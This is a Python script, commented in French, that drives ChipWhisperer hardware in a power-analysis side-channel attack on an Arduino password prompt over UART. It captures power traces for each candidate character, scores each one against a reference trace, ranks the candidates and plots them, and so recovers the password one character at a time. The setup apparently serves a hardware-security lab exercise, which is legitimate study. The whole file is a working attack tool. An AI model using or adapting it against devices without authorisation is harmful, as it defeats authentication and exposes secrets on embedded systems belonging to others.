"""Recover password characters from ChipWhisperer power traces."""

import argparse
import os
import string
import time

import chipwhisperer as cw
import matplotlib.pyplot as plt
import numpy as np


TARGET_PASSWORD_LENGTH = 8
DEFAULT_CHARACTER_SET = string.ascii_letters + string.digits + string.punctuation
REFERENCE_CHARACTER = "\x01"
UART_BAUD = 9600
ADC_SAMPLES = 12000
PLOT_SAMPLES = 2500
TRACES_PER_CANDIDATE = 7
RESPONSE_TIMEOUT = 2.0
UART_IDLE_TIMEOUT_MS = 50
RESET_PULSE_SECONDS = 0.05
RESET_SETTLE_SECONDS = 0.3
RESET_DRAIN_READS = 20
BASELINE_SAMPLES = 150
PLOT_DIR = os.path.dirname(os.path.abspath(__file__))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--password-length",
        type=int,
        default=TARGET_PASSWORD_LENGTH,
        help="longueur du mot de passe a selectionner (1-8)",
    )
    parser.add_argument(
        "--repetitions",
        type=int,
        default=TRACES_PER_CANDIDATE,
        help="nombre de captures par caractere candidat",
    )
    parser.add_argument(
        "--charset",
        default=DEFAULT_CHARACTER_SET,
        help="alphabet de caracteres ASCII imprimables, sans espaces ni retours ligne",
    )
    args = parser.parse_args()
    if not 1 <= args.password_length <= TARGET_PASSWORD_LENGTH:
        parser.error(
            f"--password-length doit respecter 1 <= longueur <= "
            f"{TARGET_PASSWORD_LENGTH} pour cette cible."
        )
    if args.repetitions < 1:
        parser.error("--repetitions doit être supérieur ou égal à 1.")
    if any(not 33 <= ord(character) <= 126 for character in args.charset):
        parser.error(
            "--charset doit contenir uniquement des caracteres ASCII "
            "imprimables, sans espace."
        )
    args.charset = "".join(dict.fromkeys(args.charset))
    if len(args.charset) < 2:
        parser.error("--charset doit contenir au moins deux caracteres distincts.")
    return args


def read_result(target) -> str:
    """Read the response and wait until the UART is idle after its next prompt."""
    chunks = []
    deadline = time.monotonic() + RESPONSE_TIMEOUT
    prompt_seen = False

    while time.monotonic() < deadline:
        timeout = UART_IDLE_TIMEOUT_MS if prompt_seen else 100
        chunk = target.read(num_char=1, timeout=timeout)
        if chunk:
            chunks.append(chunk)
            if not prompt_seen:
                response = "".join(chunks)
                for marker in ("ACCESS DENIED", "ACCESS GRANTED"):
                    result_position = response.find(marker)
                    if result_position < 0:
                        continue
                    prompt_position = response.find(
                        "Enter password:",
                        result_position + len(marker),
                    )
                    if prompt_position >= 0:
                        prompt_seen = True
                        break
        elif prompt_seen:
            return "".join(chunks)

    response = "".join(chunks)
    if response:
        received = f"Donnees recues mais reponse incomplete: {response!r}"
    else:
        received = "Aucune donnee UART recue."
    raise TimeoutError(
        "Aucune reponse complete de l'Arduino; verifie l'UART TIO1/TIO2 "
        f"et le debit de 9600 bauds. {received}"
    )


def send_uart_line(target, line: str) -> None:
    target.write(line + "\n")


def reset_and_sync_target(scope, target) -> None:
    scope.io.nrst = 0
    time.sleep(RESET_PULSE_SECONDS)
    scope.io.nrst = None
    time.sleep(RESET_SETTLE_SECONDS)

    for _ in range(RESET_DRAIN_READS):
        if not target.read(num_char=1, timeout=100):
            break
    target.flush()


def capture_probe(scope, target, guess: str) -> tuple[np.ndarray, str]:
    reset_and_sync_target(scope, target)
    scope.arm()
    send_uart_line(target, guess)

    if scope.capture():
        pending_uart = target.read(timeout=100)
        uart_detail = (
            f"Donnees UART recues: {pending_uart!r}."
            if pending_uart
            else "Aucune donnee UART recue apres l'envoi."
        )
        raise TimeoutError(
            "Aucun trigger detecte sur TIO4 (pin 14); verifie la connexion "
            f"de la sortie trigger de l'Arduino. {uart_detail}"
        )

    trace = scope.get_last_trace()
    if trace is None:
        raise RuntimeError("La capture a termine sans fournir de trace.")
    trace = np.asarray(trace)
    if trace.size != ADC_SAMPLES:
        raise RuntimeError(
            f"Trace de taille inattendue: {trace.size} au lieu de {ADC_SAMPLES}."
        )

    response = read_result(target)
    return trace, response


def print_trace_stats(label: str, trace: np.ndarray) -> None:
    window = trace[:PLOT_SAMPLES]
    peak_index = int(np.argmax(np.abs(window)))
    peak_value = float(window[peak_index])
    print(
        f"  {label} [0:{len(window)}]: "
        f"min={float(window.min()):+.6f}, "
        f"max={float(window.max()):+.6f}, "
        f"moyenne={float(window.mean()):+.6f}, "
        f"ecart-type={float(window.std()):.6f}, "
        f"RMS={float(np.sqrt(np.mean(np.square(window)))):.6f}, "
        f"crete-a-crete={float(np.ptp(window)):.6f}, "
        f"pic absolu={abs(peak_value):.6f} a l'echantillon {peak_index}"
    )


def normalize_trace(trace: np.ndarray) -> np.ndarray:
    baseline = trace[:BASELINE_SAMPLES]
    if baseline.size == 0:
        return trace
    return trace - float(np.mean(baseline))


def score_difference(trace: np.ndarray, reference_trace: np.ndarray) -> float:
    sample_count = min(PLOT_SAMPLES, trace.size, reference_trace.size)
    return float(
        np.sum(
            np.abs(trace[:sample_count] - reference_trace[:sample_count])
        )
    )


def plot_character_analysis(
    position: int,
    candidate_medians: dict[str, np.ndarray],
    reference_trace: np.ndarray,
    scores: dict[str, float],
    ranking: list[str],
) -> None:
    sample_count = min(
        PLOT_SAMPLES,
        reference_trace.size,
        min(trace.size for trace in candidate_medians.values()),
    )
    samples = np.arange(sample_count)
    plotted_characters = ranking[: min(5, len(ranking))]
    colors = plt.get_cmap("tab10", len(plotted_characters))
    figure, (trace_axis, diff_axis, score_axis) = plt.subplots(
        3, 1, figsize=(16, 12)
    )

    trace_axis.plot(
        samples,
        reference_trace[:sample_count],
        color="black",
        linewidth=1.5,
        label="Reference invalide fixe",
    )
    for rank, character in enumerate(plotted_characters):
        color = "crimson" if rank == 0 else colors(rank)
        trace = candidate_medians[character][:sample_count]
        label = f"{character!r} (score {scores[character]:.2f})"
        trace_axis.plot(
            samples,
            trace,
            color=color,
            linewidth=1.3 if rank == 0 else 0.8,
            label=label,
        )
        diff_axis.plot(
            samples,
            np.abs(trace - reference_trace[:sample_count]),
            color=color,
            linewidth=1.3 if rank == 0 else 0.8,
            label=label,
        )

    characters = list(scores)
    score_axis.bar(
        np.arange(len(characters)),
        [scores[character] for character in characters],
        color=[
            "crimson" if character == ranking[0] else "tab:blue"
            for character in characters
        ],
    )
    score_axis.set_xticks(np.arange(len(characters)))
    score_axis.set_xticklabels(
        [f"0x{ord(character):02X} {character!r}" for character in characters],
        rotation=90,
        fontsize=7,
    )
    score_axis.set_ylabel("Ecart absolu total")
    score_axis.set_xlabel("Caractere candidat (code ASCII)")
    score_axis.set_title(
        f"Candidat le plus distinct: {ranking[0]!r} "
        f"(score {scores[ranking[0]]:.2f})"
    )

    trace_axis.set_title(f"Traces medianes - position {position}")
    trace_axis.set_ylabel("Amplitude")
    trace_axis.set_xlabel("Echantillon apres le trigger")
    trace_axis.legend(loc="upper right")
    diff_axis.set_title("Difference absolue par rapport a la reference")
    diff_axis.set_ylabel("|trace - reference|")
    diff_axis.set_xlabel("Echantillon apres le trigger")
    diff_axis.legend(loc="upper right")
    figure.suptitle(f"Selection du caractere en position {position}")
    figure.tight_layout()
    figure.savefig(
        os.path.join(PLOT_DIR, f"password_character_position_{position:02d}.png"),
        dpi=140,
    )


def recover_characters(
    scope,
    target,
    password_length: int,
    charset: str,
    repetitions: int,
) -> str:
    recovered = ""

    for position in range(password_length):
        candidate_traces: dict[str, list[np.ndarray]] = {}
        candidate_scores: dict[str, list[float]] = {}
        reference_traces: list[np.ndarray] = []
        print(
            f"\nSelection du caractere {position + 1}/{password_length}; "
            f"prefixe estime: {recovered!r}"
        )
        for character in charset:
            candidate_traces[character] = []
            candidate_scores[character] = []

        for repetition in range(1, repetitions + 1):
            reference_guess = recovered + REFERENCE_CHARACTER
            reference_trace, reference_response = capture_probe(
                scope, target, reference_guess
            )
            reference_trace = normalize_trace(reference_trace)
            reference_traces.append(reference_trace)
            reference_result = (
                "accepted" if "ACCESS GRANTED" in reference_response else "denied"
            )
            print(
                f"  Reference {repetition}/{repetitions}, "
                f"UART TX={reference_guess!r} + LF: {reference_result}"
            )
            print_trace_stats("Trace reference", reference_trace)

            for candidate_index, character in enumerate(charset, start=1):
                guess = recovered + character
                trace, response = capture_probe(scope, target, guess)
                trace = normalize_trace(trace)
                candidate_traces[character].append(trace)
                score = score_difference(trace, reference_trace)
                candidate_scores[character].append(score)
                result = "accepted" if "ACCESS GRANTED" in response else "denied"
                print(
                    f"  Candidat {candidate_index:2d}/{len(charset)}, "
                    f"UART TX={guess!r} + LF, "
                    f"capture {repetition}/{repetitions}: {result}, "
                    f"score={score:.2f}"
                )
                print_trace_stats("Trace candidat", trace)
                if "ACCESS GRANTED" in response:
                    recovered += character
                    print(f"\nMot de passe estime: {recovered!r}")
                    return recovered

        candidate_medians = {
            character: np.median(np.stack(waves, axis=0), axis=0)
            for character, waves in candidate_traces.items()
        }
        reference_trace = np.median(np.stack(reference_traces, axis=0), axis=0)
        scores = {
            character: float(np.median(candidate_scores[character]))
            for character in charset
        }
        ranking = sorted(
            scores,
            key=lambda character: (
                scores[character],
                float(np.mean(candidate_scores[character])),
            ),
            reverse=True,
        )
        best_character = ranking[0]

        print(f"Classement pour la position {position + 1}:")
        for rank, character in enumerate(ranking[:5], start=1):
            print(
                f"  {rank}. {character!r} (ASCII 0x{ord(character):02X}), "
                f"score median={scores[character]:.2f}, "
                f"score moyen={float(np.mean(candidate_scores[character])):.2f}"
            )
        if len(ranking) > 1:
            gap = scores[ranking[0]] - scores[ranking[1]]
            print(f"  Ecart top1-top2: {gap:.2f}")
        print(
            "  Le caractere ayant le score le plus eleve est une estimation, "
            "a confirmer sur le graphe."
        )
        plot_character_analysis(
            position + 1,
            candidate_medians,
            reference_trace,
            scores,
            ranking,
        )
        recovered += best_character

    print(f"\nMot de passe estime: {recovered!r}")
    return recovered


def main() -> None:
    args = parse_args()
    scope = None
    target = None

    try:
        scope = cw.scope()
        scope.default_setup()
        scope.adc.samples = ADC_SAMPLES
        scope.io.tio1 = "serial_rx"
        scope.io.tio2 = "serial_tx"
        scope.io.tio4 = "high_z"

        target = cw.target(scope)
        target.baud = UART_BAUD
        target.flush()

        print(
            f"Selection de {args.password_length} caractere(s), "
            f"alphabet de {len(args.charset)} caracteres, "
            f"{args.repetitions} capture(s) par candidat."
        )
        recovered_password = recover_characters(
            scope,
            target,
            args.password_length,
            args.charset,
            args.repetitions,
        )
    finally:
        if target is not None:
            target.dis()
        if scope is not None:
            scope.dis()
        print("Deconnecte.")

    print(f"Selection terminee: {recovered_password!r}")
    print(f"Graphes enregistres dans : {PLOT_DIR}")
    plt.show()


if __name__ == "__main__":
    main()
